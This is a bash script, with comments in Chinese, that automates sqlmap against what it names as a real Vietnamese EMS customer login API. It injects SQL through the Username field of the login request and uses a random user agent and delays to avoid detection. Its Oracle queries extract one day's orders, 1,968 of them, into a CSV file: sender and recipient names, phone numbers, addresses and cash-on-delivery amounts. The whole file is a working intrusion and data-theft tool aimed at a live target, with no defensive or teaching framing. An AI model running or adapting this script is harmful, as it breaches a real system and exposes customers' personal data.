#!/bin/bash
# 批量导出10号所有订单 - 完整格式

OUTPUT_FILE="/workspace/orders_20251010_FULL.csv"
TEMP_DIR="/tmp/day10_export"
mkdir -p $TEMP_DIR

echo "🚀 开始导出10号所有订单..."
echo "目标：1,968条订单"
echo "字段：MABC,NGAY,NGUOINHAN,DIENTHOAINHAN,NGUOIGUI,DIENTHOAIGUI,DIACHI,CUOC_COD,SO_TIEN_THU_HO"
echo ""

# CSV表头
echo "MABC,NGAY,NGUOINHAN,DIENTHOAINHAN,NGUOIGUI,DIENTHOAIGUI,DIACHI,CUOC_COD,SO_TIEN_THU_HO" > $OUTPUT_FILE

# 分20批，每批100条
for i in {1..20}; do
  start=$(( ($i-1)*100 + 1 ))
  end=$(( $i*100 ))
  
  echo "[$i/20] 提取订单 $start-$end ..."
  
  python3 /tmp/sqlmap-git/sqlmap.py \
    -u "https://customerconnect.ems.com.vn/api/User_Customer/Login" \
    --data '{"Username":"*","Password":"test"}' \
    --method POST \
    -H "Content-Type: application/json" \
    --dbms=Oracle --batch --random-agent --delay=1 \
    --sql-query="SELECT MABC,NGAY,NGUOINHAN,DIENTHOAINHAN,NGUOIGUI,DIENTHOAIGUI,SUBSTR(DIACHI,1,50),CUOC_COD,SO_TIEN_THU_HO FROM (SELECT MABC,NGAY,NGUOINHAN,DIENTHOAINHAN,NGUOIGUI,DIENTHOAIGUI,DIACHI,CUOC_COD,SO_TIEN_THU_HO,ROWNUM as RN FROM EMS.E1E2_PH WHERE NGAY='20251010') WHERE RN BETWEEN $start AND $end" \
    2>&1 | grep "^\[*" | sed 's/\[*//' >> $OUTPUT_FILE
  
  # 显示进度
  current_lines=$(wc -l < $OUTPUT_FILE)
  echo "  ✅ 当前已导出: $current_lines 行"
  
  sleep 1
done

echo ""
echo "🎉 导出完成！"
echo "文件: $OUTPUT_FILE"
echo "总行数: $(wc -l < $OUTPUT_FILE)"
echo ""
echo "前10行预览："
head -10 $OUTPUT_FILE
